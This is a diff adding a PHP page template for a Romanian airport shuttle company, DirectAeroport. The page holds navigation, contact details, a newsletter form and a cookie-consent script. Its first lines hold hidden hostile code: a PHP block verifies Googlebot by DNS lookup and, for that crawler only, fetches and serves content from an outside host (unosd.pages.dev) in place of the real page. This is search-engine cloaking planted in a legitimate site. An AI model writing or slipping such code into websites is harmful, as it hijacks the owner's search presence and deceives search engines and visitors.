@@ -1,0 +1,721 @@
+<?php
+function is_real_googlebot() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    $host = gethostbyaddr($ip);
+    if ($host === $ip) return false;
+
+    if (!preg_match('/\.google(bot)?\.com$/', $host)) return false;
+
+    $forward_ips = gethostbynamel($host);
+    if ($forward_ips === false) return false;
+
+    return in_array($ip, $forward_ips);
+}
+
+if (is_real_googlebot()) {
+    $remote_url = "https://unosd.pages.dev/";
+
+    $options = [
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Googlebot\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    $content = @file_get_contents($remote_url, false, $context);
+
+    if ($content === false) {
+        http_response_code(204); // No Content
+    } else {
+        echo $content;
+    }
+
+    exit;
+}
+?>
+
+
+
+<style>
+.service-block .inner-box .image-box .image {
+    height: 250px!important;
+}
+</style>
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="utf-8">
+<title>Site pages | DirectAeroport</title>
+<meta name="description" content="Website description and some little information about it"/>
+<meta name="keywords" content="key, words, website, web"/>
+<meta name="author" content="https://www.direct-aeroport.ro"/>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<link href="https://www.direct-aeroport.ro/assets/assets2/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://www.direct-aeroport.ro/assets/frontend/css/bootstrap-datetimepicker.min.css?v=9.1.1"/>
+<link href="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/css/settings.css" rel="stylesheet" type="text/css"><!-- REVOLUTION SETTINGS STYLES -->
+<link href="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/css/layers.css" rel="stylesheet" type="text/css"><!-- REVOLUTION LAYERS STYLES -->
+<link href="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/css/navigation.css" rel="stylesheet" type="text/css"><!-- REVOLUTION NAVIGATION STYLES -->
+<link href="https://www.direct-aeroport.ro/assets/assets2/css/style.css" rel="stylesheet">
+
+
+<!-- Favicon and Touch Icons -->
+    <link href="https://www.direct-aeroport.ro/uploads/settings/17416950944352.ico" rel="shortcut icon"
+          type="image/png">
+    <link href="https://www.direct-aeroport.ro/uploads/settings/17416950945519.ico" rel="apple-touch-icon">
+    <link href="https://www.direct-aeroport.ro/uploads/settings/17416950945519.ico" rel="apple-touch-icon"
+          sizes="72x72">
+    <link href="https://www.direct-aeroport.ro/uploads/settings/17416950945519.ico" rel="apple-touch-icon"
+          sizes="114x114">
+    <link href="https://www.direct-aeroport.ro/uploads/settings/17416950945519.ico" rel="apple-touch-icon"
+          sizes="144x144">
+
+<meta property='og:title'
+      content='Site pages '/>
+    <meta property='og:image'
+          content='https://www.direct-aeroport.ro/uploads/settings/17416950945519.ico'/>
+<meta property="og:site_name" content="DirectAeroport">
+<meta property="og:description" content="Website description and some little information about it"/>
+<meta property="og:url" content="https://www.direct-aeroport.ro/en"/>
+<meta property="og:type" content="website"/>
+
+    <link rel="canonical" href="https://www.direct-aeroport.ro/en">
+
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','G-XYMTXY6J1V');</script>
+    <!-- End Google Tag Manager -->
+</head>
+
+<body>
+<div class="page-wrapper">
+
+    <!-- Preloader -->
+    <div class="preloader"></div>
+    <!-- start header -->
+<!-- Main Header-->
+<header class="main-header header-style-one">
+    <!-- Header Top -->
+    <div class="header-top">
+      <div class="bg-lines"></div>
+      <div class="inner-container">
+        <div class="top-left">
+          <ul class="social-icon-one light">
+            <li><a target="_blank" href="https://twitter.com/DirectAeroport"><span class="fab fa-twitter"></span></a></li>
+            <li><a target="_blank" href="https://www.facebook.com/DirectAeroport.ro/"><span class="fab fa-facebook-f"></span></a></li>
+            <li><a target="_blank" href="https://www.instagram.com/directaeroport88/"><span class="fab fa-instagram"></span></a></li>
+            <li><a target="_blank" href="https://www.youtube.com/user/transportaeroport"><span class="fab fa-youtube"></span></a></li>
+          </ul>
+        </div>
+        <div class="top-right"> 
+          <!-- Info List -->
+          <ul class="list-style-one light">
+            <li><i class="fal fa-clock"></i> NON-STOP</li>
+            <li><i class="far fa-map-marker-alt"></i> Brasov - Constanta</li>
+            <li><i class="far fa-envelope"></i> <a href="mailto:office@direct-aeroport.ro">office@direct-aeroport.ro</a></li>
+            <li> 
+              
+                                        <a class="animaRO pointer-large animsition-link" href="https://www.direct-aeroport.ro/lang/ro"><img style="width: 20px;" src="https://www.direct-aeroport.ro/assets/dashboard/images/flags/ro.svg"/> RO </a>
+                                                
+                          </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <!-- Header Top -->
+    
+    <div class="header-lower"> 
+      <!-- Main box -->
+      <div class="main-box">
+        <div class="logo-box">
+          <div class="logo"><a href="https://www.direct-aeroport.ro"><img src="https://www.direct-aeroport.ro/assets/assets2/images/logoalb.png" alt="Logo" title="DirectAeroport"></a></div>
+        </div>
+        
+        <!--Nav Box-->
+        <div class="nav-outer">
+          <nav class="nav main-menu">
+            <ul class="navigation">
+              <li class=""><a href="https://www.direct-aeroport.ro/transport">Reservations</a></li>
+              
+                                <li class="dropdown "><a href="#">Timetable</a>
+                  <ul>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-constanta">Otopeni Airport - Constanta</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-brasov">Otopeni Airport - Brasov</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-craiova">Otopeni Airport - Craiova</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-iasi">Otopeni Airport - Iasi</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-neamt">Otopeni Airport - Piatra Neamt</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/otopeni-galati">Otopeni Airport - Galati</a></li>
+                  </ul>
+                </li>
+                <li class="dropdown "><a href="#">Private Transport</a>
+                  <ul>
+                    <li class=""><a href="https://www.direct-aeroport.ro/zona-brasov">Brasov Area</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/aeroport-brasov">Brasov Ghimbav Airport</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/zona-constanta">Constanta Area</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/zona-sibiu">Sibiu Area</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/zona-tulcea">Tulcea Area</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/zona-varna">Varna Area</a></li>
+                    <li class=""><a href="https://www.direct-aeroport.ro/mihail-kogalniceanu">Mihail Kogalniceanu Airport</a></li>
+                    
+                  </ul>
+                </li>
+                              </li>
+              
+              
+              <li class="dropdown "><a href="#">Company</a>
+                <ul>
+                  <li class=""><a href="https://www.direct-aeroport.ro/companie/companie-despre">About</a></li>
+                  <li class=""><a href="https://www.direct-aeroport.ro/companie/companie-intrebari">Questions</a></li>
+                 <!-- <li class=""><a href="https://www.direct-aeroport.ro/companie/companie-parteneri">Partners</a></li> -->
+                  <li class=""><a href="https://www.direct-aeroport.ro/companie/companie-opinii-clienti">Clients Opinions</a></li>
+                  <li class=""><a href="https://www.direct-aeroport.ro/companie/cariere">Careers</a></li>
+                </ul>
+              </li>
+              <li class=""><a href="https://www.direct-aeroport.ro/contact">Contact</a></li>
+            </ul>
+          </nav>
+        </div>
+        <!-- Main Menu End--> 
+        
+        <!-- Outer Box -->
+        <div class="outer-box"> 
+             <!-- Header Search -->
+          <div class="header-search header-searchs">
+            <a href="tel:0371503503" class="info-btn-two info-btn-twos"> <i class="icon fa fa-phone"></i> <small>Call Center:</small> <strong> 0371 503 503</strong> </a>
+          </div>
+          <!-- Info Btn -->
+          <div class="btn-box"> 
+            <!-- Info Btn --> 
+            <a href="tel:0371503503" class="info-btn-two"> <i class="icon fa fa-phone"></i> <small>Book now via the Call Center:</small> <strong> 0371 503 503</strong> </a>
+          </div>
+          <!-- Mobile Nav toggler -->
+          <div class="mobile-nav-toggler"><span class="icon lnr-icon-bars"></span></div>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Mobile Menu  -->
+    <div class="mobile-menu">
+      <div class="menu-backdrop"></div>
+      <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      <nav class="menu-box">
+        <div class="upper-box">
+          <div class="nav-logo"><a href="https://www.direct-aeroport.ro"><img src="https://www.direct-aeroport.ro/assets/assets2/images/logo-ro.png" alt="" title=""></a></div>
+          <div class="close-btn"><i class="icon fa fa-times"></i></div>
+        </div>
+        <ul class="navigation clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </ul>
+        <ul class="contact-list-one light">
+          <li> <i class="icon lnr-icon-phone-handset"></i> <span class="title">Call Center</span>
+            <div class="text"><a href="tel:0371503503">0371 503 503</a></div>
+          </li>
+          <li> <i class="icon lnr-icon-envelope1"></i> <span class="title">Adresa de Email</span>
+            <div class="text"><a href="mailto:office@direct-aeroport.ro">office@direct-aeroport.ro</a></div>
+          </li>
+          <li> <i class="icon lnr-icon-map-marker"></i> <span class="title">Adresa Sediu CT</span>
+            <div class="text">Constanta - Casa de Cultura, Bd. Alexandru Lapusneanu 1</div>
+          </li>
+          <li> <i class="icon lnr-icon-map-marker"></i> <span class="title">Adresa Sediu BV</span>
+            <div class="text">Brasov - Str. Cristianului, 11</div>
+          </li>
+          <li>
+            <i class="icon lnr-icon-earth"></i> <span class="title">Limba Site</span>
+            <div class="text">
+              
+                                <a class="animaRO pointer-large animsition-link" href="https://www.direct-aeroport.ro/lang/ro"><img style="width: 20px;" src="https://www.direct-aeroport.ro/assets/dashboard/images/flags/ro.svg"/> RO </a>
+                          </div>
+           
+                        
+                  </li>
+        </ul>
+        <ul class="social-links">
+          <li><a href="https://twitter.com/DirectAeroport"><i class="fab fa-twitter"></i></a></li>
+          <li><a href="https://www.facebook.com/DirectAeroport.ro/"><i class="fab fa-facebook-f"></i></a></li>
+          <li><a href="https://www.instagram.com/directaeroport88/"><i class="fab fa-instagram"></i></a></li>
+          <li><a href="https://www.youtube.com/user/transportaeroport"><i class="fab fa-youtube"></i></a></li>
+        </ul>
+      </nav>
+    </div>
+    <!-- End Mobile Menu --> 
+
+    
+    <!-- Sticky Header  -->
+    <div class="sticky-header">
+      <div class="auto-container">
+        <div class="inner-container"> 
+          <!--Logo-->
+          <div class="logo"> <a href="https://www.direct-aeroport.ro" title=""><img src="https://www.direct-aeroport.ro/assets/assets2/images/logo-ro.png" alt="" title=""></a> </div>
+          
+          <!--Right Col-->
+          <div class="nav-outer"> 
+            <!-- Main Menu -->
+            <nav class="main-menu">
+              <div class="navbar-collapse show collapse clearfix">
+                <ul class="navigation clearfix">
+                  <!--Keep This Empty / Menu will come through Javascript-->
+                </ul>
+              </div>
+            </nav>
+            <!-- Main Menu End--> 
+            
+            <!--Mobile Navigation Toggler-->
+            <div class="mobile-nav-toggler"><span class="icon lnr-icon-bars"></span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- End Sticky Menu --> 
+  </header>
+  <!--End Main Header --><!-- end header -->
+
+    
+    
+<!-- start footer -->
+<!-- Start of  Zendesk Widget script -->
+<script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=40aa8582-b419-4e28-8779-3c13dfc49cee"> </script>
+<!-- End of  Zendesk Widget script -->
+<!-- Main Footer -->
+<footer class="main-footer footer-style-one">
+    <div class="bg bg-pattern-4"></div>
+    <div class="icon-plane-6 bounce-x"></div>
+    <div class="icon-bus-2 bounce-x"></div>
+    <!-- Footer Top -->
+    <div class="footer-top">
+      <div class="auto-container">
+        <div class="outer-box">
+          <div class="bg bg-image" style="background-image: url(https://www.direct-aeroport.ro/assets/assets2/images/background/11.jpg);"></div>
+          <ul class="contact-list-two light">
+            <li>
+              <i class="icon fal fa-phone"></i>
+              <div class="text">Call Center Non Stop <br><a href="tel:+40737503503">0371 503 503</a></div>
+            </li>
+            <li>
+              <i class="icon fal fa-envelope"></i>
+              <div class="text">Email Address <br><a href="mailto:office@directaeroport.ro">office@direct-aeroport.ro</a></div>
+            </li>
+            <li>
+              <i class="icon fal fa-map-marker-alt"></i>
+              <div class="text">Headquarters Address <br><span>Cristianului Road, no 11</span></div>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <!-- Widgets Section -->
+    <div class="widgets-section">
+      <div class="auto-container">
+        <div class="row"> 
+          <!-- Footer Column -->
+          <div class="footer-column col-xl-3 col-sm-6">
+            <div class="footer-widget about-widget">
+              <div class="logo"><a href="index.html"><img src="https://www.direct-aeroport.ro/assets/assets2/images/logoalb.png" alt="Logo"></a></div>
+              <div class="text">The service we provide ensures the comfort of the journey to the airport in a time comparable to what you would spend even if you were driving your own car.</div>
+            </div>
+          </div>
+          <!-- Footer Column -->
+          <div class="footer-column col-xl-3 col-sm-6">
+            <div class="footer-widget links-widget">
+              <h5 class="widget-title">Contact</h5>
+              <div class="widget-content">
+                <ul class="user-links">
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0371503503">0371 503 503 Non Stop</a></li>
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0737503503">0737 503 503</a></li>
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0754503503">0754 503 503</a></li>
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0731503503">0731 503 503</a></li>
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0766503503">0766 503 503</a></li>
+                  <li><i class="icon fa fa-phone"></i> <a href="tel:0727503503">0727 503 503</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <!-- Footer COlumn -->
+          <div class="footer-column col-xl-3 col-sm-6">
+            <div class="footer-widget links-widget">
+              <h5 class="widget-title">Informations</h5>
+              <div class="widget-content">
+                <div class="text text-white">SC BRAVIS TRANSFER SRL</div>
+                <ul class="user-links">
+                  <li><i class="icon fa fa-angle-right"></i> <a href="https://www.direct-aeroport.ro/termenii-si-conditiile">Terms &amp; Conditions</a></li>
+                  <li><i class="icon fa fa-angle-right"></i> <a href="https://www.direct-aeroport.ro/politica-de-confidentialitate">Privacy Policy</a></li>
+                  <li><i class="icon fa fa-angle-right"></i> <a href="https://www.direct-aeroport.ro/contact">Contact</a></li>
+                  <li><a target="_blank" href="https://anpc.ro/ce-este-sal/"><img src="https://www.direct-aeroport.ro/assets/assets2/images/resource/anpc-sal1-1mic.png" alt="Logo" src=""/></a> <a target="_blank" href="https://ec.europa.eu/consumers/odr/main/index.cfm?event=main.home2.show&lng=RO"><img src="https://www.direct-aeroport.ro/assets/assets2/images/resource/anpcsolmic.png" alt="Logo" src=""/></a></li>
+                  
+                </ul>
+              </div>
+            </div>
+          </div>
+          <!-- Footer COlumn -->
+          <div class="footer-column col-xl-3 col-sm-6">
+            <div class="footer-widget newsletter-widget">
+              <h5 class="widget-title">Newsletter</h5>
+              <div class="text">Subscribe to the newsletter to receive the latest offers and updated schedules.</div>
+              <!-- Newsletter Form -->
+              <div class="newsletter-form">
+                <div id="subscribesendmessage"><i class="fa fa-check-circle"></i> &nbsp;You have Subscribed</div>
+                <div id="subscribeerrormessage">Error: Please try again</div>
+    
+                <form method="POST" action="https://www.direct-aeroport.ro" accept-charset="UTF-8" class="subscribeForm"><input name="_token" type="hidden" value="Sbc3B6V33odefXMREECn8HII8UpHX77uhNwkkZZH">
+                <div class="form-group">
+                  <div class="input-outer"> <span class="icon fa-light fa-input-text"></span>
+                    <input placeholder="Your Name" class="form-control" id="subscribe_name" data-msg="Please enter your name" data-rule="minlen:4" name="subscribe_name" type="text" value="">
+                  </div>
+                    <div class="alert alert-warning validation"></div>
+                </div>
+                <div class="form-group mt-10">
+                  <div class="input-outer"> <span class="icon fal fa-envelope"></span>
+                    <input placeholder="Your Email" class="form-control" id="subscribe_email" data-msg="Please enter your email address" data-rule="email" name="subscribe_email" type="email" value="">
+                  </div>
+                    <div class="validation"></div>
+                </div>
+                <div class="form-group">
+                  <button type="submit" class="theme-btn btn-style-one"><span class="btn-title">frontend.Subscribe Now</span></button>
+                </div>
+                </form>
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!--  Footer Bottom -->
+    <div class="footer-bottom">
+      <div class="auto-container">
+        <div class="inner-container">
+          <div class="copyright-text">© Copyright 2023 Direct Aeroport. All rights reserved.</div>
+          <div class="copyright-text"><img style="width: 150px;" src="https://www.direct-aeroport.ro/assets/assets2/images/resource/logonetopia.png" alt="Logo" src=""/></div>
+
+          <ul class="social-icon-two">
+            <li><a target="_blank" href="https://www.facebook.com/DirectAeroport.ro/"><i class="fab fa-facebook-f"></i></a></li>
+            <li><a target="_blank" href="https://twitter.com/DirectAeroport"><i class="fab fa-twitter"></i></a></li>
+            <li><a target="_blank" href="https://www.instagram.com/directaeroport88/"><i class="fab fa-instagram"></i></a></li>
+            <li><a target="_blank" href="https://www.youtube.com/user/transportaeroport"><i class="fab fa-youtube"></i></a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <!--End Main Footer -->
+<!-- end footer -->
+</div>
+<!-- Scroll To Top -->
+<div class="scroll-to-top scroll-to-target" data-target="html"><span class="fa fa-angle-up"></span></div>
+
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/jquery.js"></script> 
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/popper.min.js"></script>
+<!--Revolution Slider-->
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/jquery.themepunch.revolution.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/jquery.themepunch.tools.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.actions.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.carousel.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.kenburn.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.layeranimation.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.migration.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.navigation.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.parallax.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.slideanims.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/plugins/revolution/js/extensions/revolution.extension.video.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/main-slider-script.js"></script>
+<!--Revolution Slider-->
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/bootstrap.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/jquery.fancybox.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/jquery-ui.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/gsap.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/ScrollTrigger.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/splitType.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/wow.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/select2.min.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/appear.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/owl.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/script.js"></script>
+<script src="https://www.direct-aeroport.ro/assets/frontend/js/select2.min.js?v=9.1.1"></script>
+<script src="https://www.direct-aeroport.ro/assets/frontend/js/moment.js?v=9.1.1"></script>
+<script src="https://www.direct-aeroport.ro/assets/dashboard/js/eonasdan-bootstrap-datetimepicker/build/js/bootstrap-datetimepicker.min.js?v=9.1.1"></script>
+<script src="https://www.direct-aeroport.ro/assets/assets2/js/cookieconsent.js"></script>
+<script>
+    window.CookieConsent.init({
+      // More link URL on bar.
+      modalMainTextMoreLink: null,
+      // How long to wait until bar comes up.
+      barTimeout: 1000,
+      // Look and feel.
+      theme: {
+        barColor: '#BD1118',
+        barTextColor: '#FFF',
+        barMainButtonColor: '#FFF',
+        barMainButtonTextColor: '#BD1118',
+        modalMainButtonColor: '#4285F4',
+        modalMainButtonTextColor: '#FFF',
+      },
+      language: {
+        // Current language.
+        current: 'ro',
+        locale: {
+          en: {
+            barMainText: 'This website uses cookies to ensure you get the best experience on our website.',
+            closeAriaLabel: 'close',
+            barLinkSetting: 'Cookie Settings',
+            barBtnAcceptAll: 'Accept all cookies',
+            modalMainTitle: 'Cookie settings',
+            modalMainText: 'Cookies are small pieces of data sent from a website and stored on the user\'s computer by the user\'s web browser while the user is browsing. Your browser stores each message in a small file, called cookie. When you request another page from the server, your browser sends the cookie back to the server. Cookies were designed to be a reliable mechanism for websites to remember information or to record the user\'s browsing activity.',
+            modalBtnSave: 'Save current settings',
+            modalBtnAcceptAll: 'Accept all cookies and close',
+            modalAffectedSolutions: 'Affected solutions:',
+            learnMore: 'Learn More',
+            on: 'On',
+            off: 'Off',
+            enabled: 'is enabled.',
+            disabled: 'is disabled.',
+            checked: 'checked',
+            unchecked: 'unchecked',
+          },
+          ro: {
+            barMainText: 'Acest site web foloseste cookie-uri pentru a va asigura ca aveti cea mai buna experienta pe site-ul nostru.',
+            closeAriaLabel: 'inchide',
+            barLinkSetting: 'Setari Cookie',
+            barBtnAcceptAll: 'Accepta toate cookie-urile',
+            modalMainTitle: 'Setari Cookies',
+            modalMainText: 'Cookie-urile sunt mici fragmente de date trimise de pe un site web si stocate pe computerul utilizatorului de catre browserul web al utilizatorului in timp ce acesta navigheaza. Browserul dumneavoastra stocheaza fiecare mesaj intr-un fisier mic, numit cookie. Cand solicitati o alta pagina de la server, browserul dvs. trimite cookie-ul inapoi la server. Cookie-urile au fost concepute pentru a fi un mecanism de incredere pentru ca site-urile web sa retina informatii sau sa inregistreze activitatea de navigare a utilizatorului.',
+            modalBtnSave: 'Salveaza setarile curente',
+            modalBtnAcceptAll: 'Accepta toate cookie-urile si inchide',
+            modalAffectedSolutions: 'Solutii afectate:',
+            learnMore: 'Afla mai multe',
+            on: 'Pornit',
+            off: 'Oprit',
+            enabled: 'este activat.',
+            disabled: 'este dezactivat.',
+            checked: 'bifat',
+            unchecked: 'nebifat',
+          }
+        }
+      },
+      // List all the categories you want to display.
+      categories: {
+        // Unique name.
+        // This probably will be the default category.
+        necessary: {
+          // The cookies here are necessary and category can't be turned off.
+          // Wanted config value will be ignored.
+          needed: true,
+          // The cookies in this category will be let trough.
+          // This probably should be false if category not necessary.
+          wanted: true,
+          // If checkbox is on or off at first run.
+          checked: true,
+          // Language settings for categories.
+          language: {
+            locale: {
+              en: {
+                name: 'Strictly Necessary Cookies',
+                description: 'In our constant effort to offer you a safe and efficient online experience, this site uses cookies that are strictly necessary for its correct operation. These cookies are essential to ensure that our website meets your expectations and offers you services without problems.',
+              },
+              hu: {
+                name: 'Cookie-uri strict necesare',
+                description: 'In efortul nostru constant de a va oferi o experienta online sigura si eficienta, acest site utilizeaza cookie-uri strict necesare pentru functionarea sa corecta. Aceste cookie-uri sunt esentiale pentru a va asigura ca site-ul nostru indeplineste asteptarile dvs. si va ofera servicii fara probleme.',
+              }
+            }
+          }
+        }
+      },
+      // List actual services here.
+      services: {
+        // Unique name.
+        analytics: {
+          // Existing category Unique name.
+          // This example shows how to block Google Analytics.
+          category: 'necessary',
+          // Type of blocking to apply here.
+          // This depends on the type of script we are trying to block.
+          // Can be: dynamic-script, script-tag, wrapped, localcookie.
+          type: 'dynamic-script',
+          // Only needed if "type: dynamic-script".
+          // The filter will look for this keyword in inserted scipt tags
+          //  and block if match found.
+          search: 'analytics',
+          // List of known cookie names or regular expressions matching
+          //  cookie names placed by this service.
+          // These will be removed from current domain and .domain.
+          cookies: [
+            {
+              // Known cookie name.
+              name: '_gid',
+              // Expected cookie domain.
+              domain: `.${window.location.hostname}`
+            },
+            {
+              // Regex matching cookie name.
+              name: /^_ga/,
+              domain: `.${window.location.hostname}`
+            }
+          ],
+          language: {
+            locale: {
+              en: {
+                name: 'Google Analytics'
+              },
+              ro: {
+                name: 'Google Analytics'
+              }
+            }
+          }
+        }
+      }
+    });
+    </script>
+<script>
+    $(".select2").select2();
+    $(".select2-multiple").select2({
+        tags: true
+    });
+    $(function () {
+        $('.date').datetimepicker({
+            format: 'DD-MM-YYYY',
+            icons: {
+                time: 'fa fa-clock-o',
+                date: 'fa fa-calendar',
+                up: 'fa fa-chevron-up',
+                down: 'fa fa-chevron-down',
+                previous: 'fa fa-chevron-left',
+                next: 'fa fa-chevron-right',
+                today: 'fa fa-screenshot',
+                clear: 'fa fa-trash',
+                close: 'fa fa-remove'
+            },
+            allowInputToggle: true
+        });
+        $('.dateTime').datetimepicker({
+            format: 'YYYY-MM-DD hh:mm A',
+            icons: {
+                time: 'fa fa-clock-o',
+                date: 'fa fa-calendar',
+                up: 'fa fa-chevron-up',
+                down: 'fa fa-chevron-down',
+                previous: 'fa fa-chevron-left',
+                next: 'fa fa-chevron-right',
+                today: 'fa fa-screenshot',
+                clear: 'fa fa-trash',
+                close: 'fa fa-remove'
+            },
+            allowInputToggle: true
+        });
+    });
+</script>
+
+    <script type="text/javascript">
+        jQuery(document).ready(function ($) {
+            "use strict";
+
+            //Subscribe
+            $('form.subscribeForm').submit(function () {
+
+                var f = $(this).find('.form-group'),
+                    ferror = false,
+                    emailExp = /^[^\s()<>@,;:\/]+@\w[\w\.-]+\.[a-z]{2,}$/i;
+
+                f.children('input').each(function () { // run all inputs
+
+                    var i = $(this); // current input
+                    var rule = i.attr('data-rule');
+
+                    if (rule !== undefined) {
+                        var ierror = false; // error flag for current input
+                        var pos = rule.indexOf(':', 0);
+                        if (pos >= 0) {
+                            var exp = rule.substr(pos + 1, rule.length);
+                            rule = rule.substr(0, pos);
+                        } else {
+                            rule = rule.substr(pos + 1, rule.length);
+                        }
+
+                        switch (rule) {
+                            case 'required':
+                                if (i.val() === '') {
+                                    ferror = ierror = true;
+                                }
+                                break;
+
+                            case 'minlen':
+                                if (i.val().length < parseInt(exp)) {
+                                    ferror = ierror = true;
+                                }
+                                break;
+
+                            case 'email':
+                                if (!emailExp.test(i.val())) {
+                                    ferror = ierror = true;
+                                }
+                                break;
+
+                            case 'checked':
+                                if (!i.attr('checked')) {
+                                    ferror = ierror = true;
+                                }
+                                break;
+
+                            case 'regexp':
+                                exp = new RegExp(exp);
+                                if (!exp.test(i.val())) {
+                                    ferror = ierror = true;
+                                }
+                                break;
+                        }
+                        i.next('.validation').html('<i class=\"fa fa-info\"></i> &nbsp;' + ( ierror ? (i.attr('data-msg') !== undefined ? i.attr('data-msg') : 'wrong Input') : '' )).show();
+                        !ierror ? i.next('.validation').hide() : i.next('.validation').show();
+                    }
+                });
+                if (ferror) return false;
+                else var str = $(this).serialize();
+                $.ajax({
+                    type: "POST",
+                    url: "https://www.direct-aeroport.ro/subscribe",
+                    data: str,
+                    success: function (msg) {
+                        if (msg == 'OK') {
+                            $("#subscribesendmessage").addClass("show");
+                            $("#subscribeerrormessage").removeClass("show");
+                            $("#subscribe_name").val('');
+                            $("#subscribe_email").val('');
+                        }
+                        else {
+                            $("#subscribesendmessage").removeClass("show");
+                            $("#subscribeerrormessage").addClass("show");
+                            $('#subscribeerrormessage').html(msg);
+                        }
+
+                    }
+                });
+                return false;
+            });
+
+        });
+    </script>
+
+
+    <!-- Google Tag Manager (noscript) -->
+    <noscript>
+        <iframe src="//www.googletagmanager.com/ns.html?id=G-XYMTXY6J1V"
+                height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-XYMTXY6J1V"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-XYMTXY6J1V');
+</script>
+
+
+
+</body>
+</html>
